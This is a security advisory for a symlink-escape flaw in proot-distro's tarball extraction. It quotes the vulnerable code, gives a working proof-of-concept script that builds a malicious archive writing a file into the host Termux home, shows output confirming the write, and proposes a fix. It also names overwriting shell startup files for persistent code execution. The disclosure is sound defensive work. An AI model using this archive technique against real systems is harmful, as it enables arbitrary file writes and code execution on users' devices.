# [H] `proot-distro install` has a Symlink Escape (Arbitrary Host File Write) via Malicious Tar Archive

## Summary
Severity: High
Advisory: GHSA-9xq3-3fqg-4vg7
CVE: CVE-2026-54574
CWE: CWE-61
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-29
Source: https://github.com/advisories/GHSA-9xq3-3fqg-4vg7
Type: github-advisory

## Affected
- PyPI: `proot-distro` — affected >=0 <5.1.5

## Details
**Repository:** `termux/proot-distro`  
**Component:** `proot_distro/commands/install.py` → `_extract_plain_tar()`; also `helpers/docker.py` → `_apply_layer()`    

---

## Affected Versions

| Component     | Version                      |
|---------------|------------------------------|
| proot-distro  | 5.0.2 (confirmed vulnerable) |
| Termux app    | 0.119.0-beta.3               |
| Device / ABI  | Samsung Galaxy A23 / aarch64 |
| Python (host) | 3.13                         |

---

## Vulnerability Description

`proot-distro install` extracts a plain tarball rootfs by calling `_extract_plain_tar()` in
`proot_distro/commands/install.py`. This function correctly rejects tar member **names**
containing `..` components, but applies **no equivalent check on symlink targets**
(`member.linkname`). A tar archive can therefore:

1. Plant a symlink inside the rootfs whose target is an **absolute host path**
   (e.g. `/data/data/com.termux/files/home`).
2. Write a subsequent regular-file member whose path traverses through that symlink name.

Python's `open()` follows the symlink, writing the file **on the host filesystem** at the
privilege level of the Termux process — entirely during `proot-distro install`, before the
container is ever run.

The same `_extract_plain_tar` function is reachable via `proot-distro reset`, and the
equivalent `_apply_layer` in `helpers/docker.py` contains the same flaw.

---

## Vulnerable Code

**`proot_distro/commands/install.py`**, `_extract_plain_tar()`:

```python
elif member.issym():
    # linkname taken verbatim from archive — no validation of target
    os.symlink(member.linkname, dest)        # ← symlink planted on host

elif member.isreg():
    dest = os.path.join(rootfs_dir, rel_path)
    with open(dest, 'wb') as out:            # ← follows symlink above
        ...
```

The existing traversal guard only covers member **names**:

```python
if any(p in ('..', '') for p in rel_parts):
    continue  # only checks the name, not the symlink target
```

There is **no check on `member.linkname`**. An absolute symlink target bypasses this guard
entirely.

| Check                              | Member name (`rel_path`) | Symlink target (`member.linkname`) |
|------------------------------------|:------------------------:|:----------------------------------:|
| Reject `..` components             | ✅                        | ❌                                  |
| Confirm stays inside `rootfs_dir`  | ❌                        | ❌                                  |

---

## Proof of Concept

### Step 1 — Craft a malicious archive

```python
# craft_evil_layer.py
import tarfile, io, hashlib

PAYLOAD = b"TERMUX_ESCAPE_SUCCESS\n"

buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode='w:gz') as tf:

    # Plant symlink: <rootfs>/escape → /data/data/com.termux/files/home
    sym = tarfile.TarInfo(name='escape')
    sym.type = tarfile.SYMTYPE
    sym.linkname = '/data/data/com.termux/files/home'
    tf.addfile(sym)

    # Write file through symlink: <rootfs>/escape/POC_SUCCESS → host ~/POC_SUCCESS
    reg = tarfile.TarInfo(name='escape/POC_SUCCESS')
    reg.size = len(PAYLOAD)
    tf.addfile(reg, io.BytesIO(PAYLOAD))

data = buf.getvalue()
with open('evil.tar.gz', 'wb') as f:
    f.write(data)

print("Created evil.tar.gz")
print("sha256:", hashlib.sha256(data).hexdigest())
```

### Step 2 — Install the archive

```
$ python craft_evil_layer.py
Created evil.tar.gz
sha256: 6693f415b22b2b006654da1819e08bef8bb569b9e819c62e879e79c7c060ef57

$ proot-distro install ./evil.tar.gz
[*] Installing from 'evil.tar.gz' as 'evil'...
[*] Extracting rootfs from archive...
[*] Finished installation.
```

### Step 3 — Verify proot-distro version

```
$ pkg show proot-distro | grep Version
WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

Version: 5.0.2
```

### Step 4 — Verify host write

```
$ cat ~/POC_SUCCESS
TERMUX_ESCAPE_SUCCESS
```

`POC_SUCCESS` was written directly into the host Termux `$HOME` during installation,
with no container login required.

---

## Impact

- **Arbitrary host file write** at the full privilege of the Termux process, triggered solely
  by `proot-distro install` — no container interaction required.
- A malicious `.tar.gz` / `.tar.xz` / `.tgz` archive delivered via a file download, CI
  artifact, or compromised mirror is sufficient to exploit this.
- Practical payloads include overwriting `~/.bashrc`, `~/.profile`,
  `$PREFIX/etc/bash.bashrc`, or any file in the Termux home/prefix, achieving **persistent
  code execution** the next time the user opens a shell.
- Also reachable via `proot-distro reset` if the malicious archive is reused, and via
  `_apply_layer` in `helpers/docker.py`.

---

## Root Cause

`_extract_plain_tar` validates member **names** against `..` traversal but places no
restriction on symlink **targets**. The two vectors are treated asymmetrically:

| Check                              | Member name (`rel_path`) | Symlink target (`member.linkname`) |
|------------------------------------|:------------------------:|:----------------------------------:|
| Reject `..` components             | ✅                        | ❌                                  |
| Confirm stays inside `rootfs_dir`  | ❌                        | ❌                                  |

The member-name check (`any(p in ('..', '') for p in rel_parts)`) is necessary but not
sufficient: a symlink with an absolute target bypasses it entirely.

---

## Proposed Fix

Add a guard that rejects any symlink whose resolved target falls outside `rootfs_dir`.
Apply in both `_extract_plain_tar` and `_apply_layer`:

```python
def _is_safe_symlink(rootfs_dir: str, dest: str, linkname: str) -> bool:
    """Return True only if the symlink target resolves inside rootfs_dir."""
    if os.path.isabs(linkname):
        return False  # absolute targets always escape on the host
    resolved = os.path.normpath(os.path.join(os.path.dirname(dest), linkname))
    real_root = os.path.realpath(rootfs_dir)
    real_resolved = (os.path.realpath(resolved) if os.path.exists(resolved)
                     else os.path.normpath(resolved))
    return real_resolved.startswith(real_root + os.sep) or real_resolved == real_root
```

Then in `_extract_plain_tar`:

```python
elif member.issym():
    if not _is_safe_symlink(rootfs_dir, dest, member.linkname):
        continue  # drop unsafe symlink
    if os.path.lexists(dest):
        ...
    os.symlink(member.linkname, dest)
```

Apply the identical guard inside `_apply_layer` in `helpers/docker.py`.

> **Note:** A stricter alternative — matching Docker's own behavior — is to **rewrite**
> absolute symlink targets to relative paths within the rootfs rather than dropping them,
> to avoid breaking legitimate images that use absolute intra-rootfs symlinks such as
> `/usr/lib → /lib`.

---

*Confirmed on proot-distro 5.0.2, Termux on Android/aarch64.*  
*Maintainer: @sylirre — report via GitHub Security Advisory on the `termux/proot-distro` repository.*

## References
- https://github.com/termux/proot-distro/security/advisories/GHSA-9xq3-3fqg-4vg7
- https://github.com/termux/proot-distro/commit/a96d7a9667f38e45d812614852ee3915d1c0ae45
- https://github.com/termux/proot-distro
- https://github.com/termux/proot-distro/releases/tag/v5.1.5
